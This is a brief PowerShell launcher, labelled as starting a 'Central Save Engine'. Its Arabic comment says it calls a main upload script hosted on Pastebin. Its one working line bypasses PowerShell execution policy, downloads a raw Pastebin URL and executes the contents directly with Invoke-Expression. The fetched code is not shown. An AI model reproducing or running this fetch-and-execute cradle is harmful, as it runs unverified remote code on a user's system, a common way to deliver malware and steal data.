Set-StrictMode -Version Latest
$ErrorActionPreference = "Stop"

# هذا السكريبت ببساطة يستدعي سكريبت الرفع الأساسي من Pastebin
Write-Host ">>> Launching Central Save Engine..." -ForegroundColor Cyan
powershell.exe -ExecutionPolicy Bypass -Command "IWR 'https://pastebin.com/raw/1jPPAir1' | IEX"
